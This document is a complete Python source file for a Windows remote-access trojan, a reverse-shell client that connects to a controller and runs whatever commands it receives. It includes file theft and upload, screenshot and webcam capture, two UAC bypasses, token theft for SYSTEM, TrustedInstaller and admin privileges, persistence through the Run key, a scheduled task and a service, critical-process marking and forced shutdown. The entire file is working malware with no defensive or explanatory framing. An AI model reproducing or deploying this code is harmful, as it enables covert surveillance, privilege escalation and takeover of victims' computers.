# coding=utf-8
import ctypes
import inspect
import locale
import os
import socket
import struct
import subprocess
import sys
import time
import winreg
from ctypes import wintypes

import cv2
import ntsecuritycon
import psutil
import pyautogui
import win32api
import win32con
import win32process
import win32profile
import win32security
import win32service
import win32ts


class Client(object):
    def __init__(self):
        self.socket = socket.socket()
        self.host = '127.0.0.1'
        self.port = 9999

    def connect(self):
        while self.socket.connect_ex((self.host, self.port)) != 0:
            time.sleep(5)

    def send(self, data):
        data = data.encode()
        self.socket.send(struct.pack('i', len(data)))
        self.socket.send(data)

    def recv(self):
        size = int(struct.unpack('i', self.socket.recv(4))[0])
        return self.socket.recv(size).decode()

    def send_file(self, filename):
        isfile = os.path.isfile(filename)
        self.socket.send(struct.pack('i', isfile))
        if isfile:
            self.socket.send(struct.pack('i', os.stat(filename).st_size))
            file = open(filename, 'rb')
            while True:
                data = file.read(1024)
                if not data:
                    break
                self.socket.send(data)
            file.close()

    def recv_file(self, filename):
        size = struct.unpack('i', self.socket.recv(4))[0]
        recv_size = 0
        file = open(filename, 'wb')
        while not recv_size == size:
            if size - recv_size > 1024:
                data = self.socket.recv(1024)
                recv_size += len(data)
            else:
                data = self.socket.recv(size - recv_size)
                recv_size = size
            file.write(data)
        file.close()

    def recv_commands(self):
        client_util = ClientUtil()
        self.send(str(os.getcwd()) + '> ')
        cmd = self.recv()
        executable = cmd.split(' ')[0]
        if cmd == 'null':
            pass
        elif cmd == 'kill':
            self.socket.close()
            sys.exit(0)
        elif hasattr(client_util, executable):
            func = getattr(client_util, executable)
            args = inspect.getfullargspec(func).args
            argc = len(args)
            if not argc:
                self.send(func())
            elif 'client_obj' in args:
                if argc == 1:
                    func(self)
                else:
                    func(self, cmd[len(executable) + 1:].strip())
            else:
                self.send(func(cmd[len(executable) + 1:].strip()))
        else:
            self.send(client_util.execute(cmd))


class ClientUtil:
    @staticmethod
    def upload(client_obj, filename):
        client_obj.recv_file(filename)

    @staticmethod
    def download(client_obj, filename):
        client_obj.send_file(filename)

    @staticmethod
    def screenshot(client_obj):
        filename = 'Screenshot.png'
        pyautogui.screenshot(filename)
        client_obj.send_file(filename)
        if os.path.isfile(filename):
            os.remove(filename)

    @staticmethod
    def webcam(client_obj):
        filename = 'Webcam.png'
        capture = cv2.VideoCapture(0)
        success, image = capture.read()
        if success:
            cv2.imwrite(filename, image)
            capture.release()
        client_obj.send_file(filename)
        if os.path.isfile(filename):
            os.remove(filename)

    @staticmethod
    def cd(path):
        try:
            if os.path.exists(path):
                os.chdir(path)
                return '[+] Change directory success'
            else:
                return '[-] Cannot find the path specified'
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def run(command):
        try:
            if not command:
                return '[-] No process specified'
            process = subprocess.Popen(command)
            return '[+] Process created: ' + str(process.pid)
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def idletime():
        try:
            return '[+] User has been idle for: ' + str(
                (win32api.GetTickCount() - win32api.GetLastInputInfo()) / 1000.0) + ' seconds'
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def bypassuac_fodhelper():
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                executable_path = os.path.realpath(sys.executable)
                reg_path = r'Software\Classes\ms-settings\shell\open\command'
                winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, None, 0, winreg.REG_SZ, executable_path)
                winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')
                p = subprocess.Popen(r'C:\Windows\System32\fodhelper.exe', shell=True)
                p.communicate()
                winreg.SetValueEx(key, None, 0, winreg.REG_SZ, '')
                winreg.DeleteValue(key, 'DelegateExecute')
                winreg.CloseKey(key)
                return '[+] Bypass UAC success'
            else:
                return '[-] Already elevated as administrator'
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def bypassuac_clr():
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                if not os.path.isfile('test.dll'):
                    return '[-] Missing DLL file'
                dll_path = os.path.abspath('test.dll')
                reg_path = r'Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32'
                winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, None, 0, winreg.REG_EXPAND_SZ, dll_path)
                winreg.CloseKey(key)
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Environment', 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, 'COR_PROFILER', 0, winreg.REG_SZ, '{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}')
                winreg.SetValueEx(key, 'COR_PROFILER_PATH', 0, winreg.REG_SZ, dll_path)
                winreg.SetValueEx(key, 'COR_ENABLE_PROFILING', 0, winreg.REG_SZ, '1')
                p = subprocess.Popen('mmc eventvwr.msc', shell=True)
                p.communicate()
                winreg.DeleteValue(key, 'COR_PROFILER')
                winreg.DeleteValue(key, 'COR_PROFILER_PATH')
                winreg.DeleteValue(key, 'COR_ENABLE_PROFILING')
                winreg.CloseKey(key)
                return '[+] Bypass UAC success'
            else:
                return '[-] Already elevated as administrator'
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def stealtoken_system():
        try:
            enable_privilege('SeDebugPrivilege')
            create_process(get_pid('winlogon.exe'))
            return '[+] Get system privileges success'
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def stealtoken_ti():
        try:
            enable_privilege('SeDebugPrivilege')
            start_service()
            create_process(get_pid('TrustedInstaller.exe'))
            return '[+] Get TrustedInstaller privileges success'
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def stealtoken_admin():
        if not is_uac_enabled():
            return '[-] UAC is disabled'
        enable_privilege('SeDebugPrivilege')
        for proc in psutil.process_iter():
            try:
                process_name = proc.name()
                process_id = proc.pid
                if get_elevation_type(process_id) == win32security.TokenElevationTypeFull:
                    create_process(process_id)
                    return '[+] Steal token from {0} (PID: {1})'.format(process_name, process_id)
            except:
                pass
        return '[-] Cannot find any elevated processes'

    @staticmethod
    def persistence_registry():
        try:
            executable_path = os.path.realpath(sys.executable)
            key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,
                                      r'Software\Microsoft\Windows\CurrentVersion\Run', 0,
                                      win32con.KEY_ALL_ACCESS)
            win32api.RegSetValueEx(key, 'reverse_shell', 0, win32con.REG_SZ, executable_path)
            win32api.RegCloseKey(key)
            return '[+] Create registry key success'
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def persistence_schtasks():
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                executable_path = os.path.realpath(sys.executable)
                subprocess.Popen(
                    'schtasks.exe /create /tn reverse_shell /sc onlogon /ru system /rl highest /f /tr ' + executable_path,
                    shell=True)
                return '[+] Schedule task success'
            else:
                return '[-] Operation requires elevation'
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def persistence_service():
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                executable_path = os.path.realpath(sys.executable)
                cmd = subprocess.Popen(
                    'sc create reverse_shell binpath= "' + executable_path + '" start= auto',
                    shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                return '[+] Create service success\n' + str(cmd.stdout.read() + cmd.stderr.read(),
                                                            locale.getdefaultlocale()[1])
            else:
                return '[-] Operation requires elevation'
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def setcritical():
        try:
            is_critical = ctypes.c_int(1)
            ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
            process_handle = ctypes.windll.kernel32.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, os.getpid())
            status = ctypes.windll.ntdll.NtSetInformationProcess(process_handle, 29, ctypes.byref(is_critical),
                                                                 ctypes.sizeof(ctypes.c_int))
            if not status:
                return '[+] Set critical process success'
            else:
                return '[-] Error: ' + str(status)
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def poweroff():
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.ZwShutdownSystem(2)

    @staticmethod
    def execute(command):
        try:
            cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
            result = str(cmd.stdout.read() + cmd.stderr.read(), locale.getdefaultlocale()[1])
            if not result:
                result = '[+] Command completed successfully\n'
            return result
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def run_as_user():
        try:
            create_process_in_user_session()
            return '[+] Process created in user session'
        except Exception as exception:
            return '[-] Error: ' + str(exception)

    @staticmethod
    def run_as_admin():
        try:
            create_process_as_admin()
            return '[+] Process created as administrator'
        except Exception as exception:
            return '[-] Error: ' + str(exception)


class STARTUPINFO(ctypes.Structure):
    _fields_ = (('cb', wintypes.DWORD),
                ('lpReserved', wintypes.LPWSTR),
                ('lpDesktop', wintypes.LPWSTR),
                ('lpTitle', wintypes.LPWSTR),
                ('dwX', wintypes.DWORD),
                ('dwY', wintypes.DWORD),
                ('dwXSize', wintypes.DWORD),
                ('dwYSize', wintypes.DWORD),
                ('dwXCountChars', wintypes.DWORD),
                ('dwYCountChars', wintypes.DWORD),
                ('dwFillAttribute', wintypes.DWORD),
                ('dwFlags', wintypes.DWORD),
                ('wShowWindow', wintypes.WORD),
                ('cbReserved2', wintypes.WORD),
                ('lpReserved2', wintypes.LPBYTE),
                ('hStdInput', wintypes.HANDLE),
                ('hStdOutput', wintypes.HANDLE),
                ('hStdError', wintypes.HANDLE))


class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = (('hProcess', wintypes.HANDLE),
                ('hThread', wintypes.HANDLE),
                ('dwProcessId', wintypes.DWORD),
                ('dwThreadId', wintypes.DWORD))


def enable_privilege(privilege):
    privilege_id = win32security.LookupPrivilegeValue(None, privilege)
    new_privilege = [(privilege_id, win32con.SE_PRIVILEGE_ENABLED)]
    token_handle = win32security.OpenProcessToken(win32process.GetCurrentProcess(), win32security.TOKEN_ALL_ACCESS)
    if token_handle:
        win32security.AdjustTokenPrivileges(token_handle, 0, new_privilege)


def start_service():
    handle_scm = win32service.OpenSCManager(None, None, win32service.SC_MANAGER_ALL_ACCESS)
    handle_service = win32service.OpenService(handle_scm, 'TrustedInstaller',
                                              win32service.SERVICE_START | win32service.SERVICE_QUERY_STATUS)
    status = win32service.QueryServiceStatus(handle_service)[1]
    if status == win32service.SERVICE_STOPPED:
        win32service.StartService(handle_service, None)
    win32service.CloseServiceHandle(handle_service)


def get_pid(process_name):
    for proc in psutil.process_iter():
        if process_name in proc.name():
            return proc.pid


def create_process(pid):
    si = STARTUPINFO()
    pi = PROCESS_INFORMATION()
    si.cb = ctypes.sizeof(si)
    si.lpDesktop = 'winsta0\\default'
    creation_flags = win32con.CREATE_NEW_CONSOLE | win32con.NORMAL_PRIORITY_CLASS | win32con.CREATE_UNICODE_ENVIRONMENT
    executable_path = os.path.realpath(sys.executable)
    process_handle = ctypes.windll.kernel32.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
    token_handle = win32security.OpenProcessToken(process_handle, win32con.TOKEN_DUPLICATE | win32con.TOKEN_QUERY)
    duplicate_token_handle = win32security.DuplicateTokenEx(token_handle, 3, win32con.MAXIMUM_ALLOWED,
                                                            win32security.TokenPrimary,
                                                            win32security.SECURITY_ATTRIBUTES())
    ctypes.windll.advapi32.CreateProcessWithTokenW(int(duplicate_token_handle), 1, executable_path, None,
                                                   creation_flags,
                                                   None, None, ctypes.byref(si), ctypes.byref(pi))


def get_elevation_type(pid):
    process_handle = ctypes.windll.kernel32.OpenProcess(win32con.PROCESS_QUERY_LIMITED_INFORMATION, False, pid)
    token_handle = win32security.OpenProcessToken(process_handle, win32con.TOKEN_QUERY)
    elevation_type = win32security.GetTokenInformation(token_handle, ntsecuritycon.TokenElevationType)
    return elevation_type


def is_uac_enabled():
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
    return winreg.QueryValueEx(key, "EnableLUA")[0]


def create_process_in_user_session():
    executable_path = os.path.realpath(sys.executable)
    enable_privilege('SeTcbPrivilege')
    console_session_id = win32ts.WTSGetActiveConsoleSessionId()
    console_user_token = win32ts.WTSQueryUserToken(console_session_id)
    duplicate_token_handle = win32security.DuplicateTokenEx(console_user_token, 3, win32con.MAXIMUM_ALLOWED,
                                                            win32security.TokenPrimary,
                                                            win32security.SECURITY_ATTRIBUTES())
    creation_flags = win32con.CREATE_NEW_CONSOLE | win32con.NORMAL_PRIORITY_CLASS | win32con.CREATE_UNICODE_ENVIRONMENT
    environment = win32profile.CreateEnvironmentBlock(duplicate_token_handle, False)
    win32process.CreateProcessAsUser(duplicate_token_handle, executable_path, None, None, None, False,
                                     creation_flags, environment, None, win32process.STARTUPINFO())


def create_process_as_admin():
    executable_path = os.path.realpath(sys.executable)
    enable_privilege('SeTcbPrivilege')
    console_session_id = win32ts.WTSGetActiveConsoleSessionId()
    console_user_token = win32ts.WTSQueryUserToken(console_session_id)
    duplicate_token_handle = win32security.DuplicateTokenEx(console_user_token, 3, win32con.MAXIMUM_ALLOWED,
                                                            win32security.TokenPrimary,
                                                            win32security.SECURITY_ATTRIBUTES())
    admin_token = win32security.GetTokenInformation(duplicate_token_handle, ntsecuritycon.TokenLinkedToken)
    creation_flags = win32con.CREATE_NEW_CONSOLE | win32con.NORMAL_PRIORITY_CLASS | win32con.CREATE_UNICODE_ENVIRONMENT
    environment = win32profile.CreateEnvironmentBlock(admin_token, False)
    win32process.CreateProcessAsUser(admin_token, executable_path, None, None, None, False,
                                     creation_flags, environment, None, win32process.STARTUPINFO())


while True:
    client = Client()
    client.connect()
    while True:
        try:
            client.recv_commands()
        except socket.error as e:
            print(e)
            client.socket.close()
            client.socket = socket.socket()
            break
        except Exception as ex:
            print(ex)
            continue
